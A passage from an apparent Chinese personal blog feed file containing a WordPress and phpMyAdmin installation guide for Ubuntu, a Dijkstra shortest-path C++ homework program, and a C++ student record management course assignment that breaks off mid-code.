class="code"><pre><span class="line">sudo apt-get install phpmyadmin</span><br><span class="line">ln -s /etc/phpmyadmin/apache.conf /etc/apache2/conf-available/phpmyadmin.conf</span><br><span class="line">sudo service apache2 restart</span><br><span class="line">sudo a2enconf phpmyadmin</span><br></pre></td></tr></table></figure><br>启用Apache mod_rewrite模块。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo a2enmod rewrite</span><br><span class="line">sudo service apache2 restart</span><br></pre></td></tr></table></figure><br><strong>初始化数据库</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mysql -u root -p </span><br><span class="line">Enter Password: 密码（密码输入不可见)</span><br><span class="line">mysql&gt;CREATE DATABASE wordpress;</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">mysql&gt;FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt;<span class="built_in">exit</span></span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>配置WordPress</strong><br>下载并解压后将wordpress目录下所有文件复制到/var/www/html<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://cn.wordpress.org/latest-zh_CN.tar.gz</span><br><span class="line">tar zxvf latest-zh_CN.tar.gz</span><br><span class="line">cp -r wordpress/* /var/www/html</span><br></pre></td></tr></table></figure><br>接下来就可以访问服务器ip进行最后的配置了。<br>另外，访问 <a href="http://ip/phpmyadmin">http://ip/phpmyadmin</a> 可以访问 phpmyadmin。</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>WordPress</tag>
      </tags>
  </entry>
  <entry>
    <title>最短路</title>
    <url>/post/f216fabe/</url>
    <content><![CDATA[<h1 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id="more"></a><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">int</span> N,M,MAP[<span class="number">1020</span>][<span class="number">1020</span>];</span><br><span class="line"><span class="keyword">bool</span> vis[<span class="number">1020</span>];</span><br><span class="line"><span class="keyword">int</span> dis[<span class="number">1020</span>],prev[<span class="number">1020</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		vis[i]=<span class="literal">false</span>;</span><br><span class="line">		dis[i]=INF;</span><br><span class="line">	&#125;</span><br><span class="line">	dis[start]=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> v=<span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">1</span>;u&lt;=N;u++)</span><br><span class="line">		<span class="keyword">if</span>(!vis[u]&amp;&amp;(v==<span class="number">-1</span>||dis[u]&lt;dis[v]))v=u;</span><br><span class="line">		<span class="keyword">if</span>(v==<span class="number">-1</span>)<span class="keyword">break</span>;</span><br><span class="line">		vis[v]=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">1</span>;u&lt;=N;u++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!vis[u])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(dis[u]&gt;dis[v]+MAP[v][u])</span><br><span class="line">				&#123;</span><br><span class="line">					dis[u]=dis[v]+MAP[v][u];</span><br><span class="line">					prev[u]=v;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;The Shortest Path Length is &quot;</span>&lt;&lt;dis[end]&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt;S;</span><br><span class="line">	<span class="keyword">while</span>(prev[end])</span><br><span class="line">	&#123;</span><br><span class="line">		S.push(end);</span><br><span class="line">		end=prev[end];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;The Path is &quot;</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;start;</span><br><span class="line">	<span class="keyword">while</span>(!S.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot; -&gt; &quot;</span>&lt;&lt;S.top();</span><br><span class="line">		S.pop();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,c,st,en;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Input Sum Of Vertex: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Input Sum Of Edges: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;M;</span><br><span class="line">	<span class="built_in">memset</span>(MAP,INF,<span class="keyword">sizeof</span>(MAP));</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Input Weight Of Vertexs: &quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">while</span>(M--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">		MAP[a][b]=c;</span><br><span class="line">		MAP[b][a]=c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;Adjacency Matrix is:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=N;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(MAP[i][j]==INF)<span class="built_in">printf</span>(<span class="string">&quot;INF &quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%03d &quot;</span>,MAP[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;Input Two Vertexs: &quot;</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;st&gt;&gt;en;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	Dijkstra(st,en);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>最短路</tag>
        <tag>Dijkstra</tag>
      </tags>
  </entry>
  <entry>
    <title>学生信息管理系统</title>
    <url>/post/36af3259/</url>
    <content><![CDATA[<blockquote>
<p>C++课程作业</p>
</blockquote>
<a id="more"></a>
<p><strong>非文件操作:</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> K=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">STU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ll Num;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> Sex;</span><br><span class="line">    <span class="keyword">double</span> Score;</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">TITLE_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ADD_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">CHANGE_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DEL_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SHOW_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SORT_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MAX_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP</span><span class="params">(STU,STU)</span></span>;</span><br><span class="line">    STU()</span><br><span class="line">    &#123;</span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~STU()&#123;&#125;</span><br><span class="line">&#125;Boy[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP</span><span class="params">(STU a,STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.Score == b.Score)</span><br><span class="line">		<span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line">	<span class="keyword">return</span> a.Score&gt;b.Score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::TITLE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t1:\tADD A STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t2:\tCHANGE STUDENTS\&#x27;S INFORMATION&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t3:\tDELETE A STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t4:\tSHOW STUDENTS INFORMATION&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t5:\tSORT BY SCORE&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t6:\tSHOW THE MAX SCORE\&#x27; STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t0:\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::ADD_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要添加的学生人数&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> T;<span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入&quot;</span>&lt;&lt;T&lt;&lt;<span class="string">&quot;行学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;T;i++,K++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;Boy[K].Num&gt;&gt;Boy[K].Name&gt;&gt;Boy[K].Sex&gt;&gt;Boy[K].Score;</span><br><span class="line">        Boy[K].flag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;学生信息导入成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::CHANGE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ll num;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num==Boy[i].Num)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;Boy[i].Num&gt;&gt;Boy[i].Name&gt;&gt;Boy[i].Sex&gt;&gt;Boy[i].Score;</span><br><span class="line">                Boy[i].flag=<span class="number">0</span>;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;学生信息修改成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::DEL_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ll num;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num==Boy[i].Num)</span><br><span class="line">            &#123;</span><br><span class="line">                Boy[i].flag=<span class="number">1</span>;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;DELETE SUCCESS!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SHOW_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;\tThe Lists Of Students Are Here&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Boy[i].flag==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;Boy[i].Num&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">8</span>)&lt;&lt;Boy[i].Name;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t &quot;</span>&lt;&lt;Boy[i].Sex&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;Boy[i].Score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SORT_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sort(Boy,Boy+K,CMP);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;学生信息排序成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::MAX_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Maxn=<span class="number">0</span>,Flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Boy[i].Score&gt;=Boy[Maxn].Score)</span><br><span class="line">        &#123;</span><br><span class="line">            Maxn=i;</span><br><span class="line">            Flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;Boy[Maxn].Num&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">8</span>)&lt;&lt;Boy[Maxn].Name;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t &quot;</span>&lt;&lt;Boy[Maxn].Sex&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;Boy[Maxn].Score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STU S;</span><br><span class="line">    S.TITLE_STU();</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">1</span>)S.ADD_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)S.CHANGE_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)S.DEL_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)S.SHOW_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">5</span>)S.SORT_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">6</span>)S.MAX_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        system(<span class="string">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class="line">        S.TITLE_STU();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>文件操作:</strong><br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> K = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">STU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	ll Num;</span><br><span class="line">	<span class="keyword">char</span> Name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> Sex;</span><br><span class="line">	<span class="keyword">double</span> Score;</span><br><span class="line">	<span class="keyword">bool</span> flag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">READ_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">WRITE_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">TITLE_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ADD_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">CHANGE_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">DEL_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">SHOW_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">SORT_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">MAX_STU</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP1</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP2</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP3</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line">	STU()</span><br><span class="line">	&#123;</span><br><span class="line">		flag = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	~STU() &#123;&#125;</span><br><span class="line">&#125;Boy[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::READ_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp = fopen(<span class="string">&quot;STU.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%lld %s %c %lf&quot;</span>, &amp;Boy[K].Num, &amp;Boy[K].Name, &amp;Boy[K].Sex, &amp;Boy[K].Score) != EOF)</span><br><span class="line">	&#123;</span><br><span class="line">		Boy[K].flag = <span class="number">0</span>;</span><br><span class="line">		K++;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::WRITE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE *fp = fopen(<span class="string">&quot;STU.dat&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; K; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(Boy[i].flag==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">fprintf</span>(fp, <span class="string">&quot;%lld %s %c %lf\n&quot;</span>, Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP1</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP2</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(a.Name,b.Name)==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strcmp</span>(a.Name,b.Name)&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP3</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span 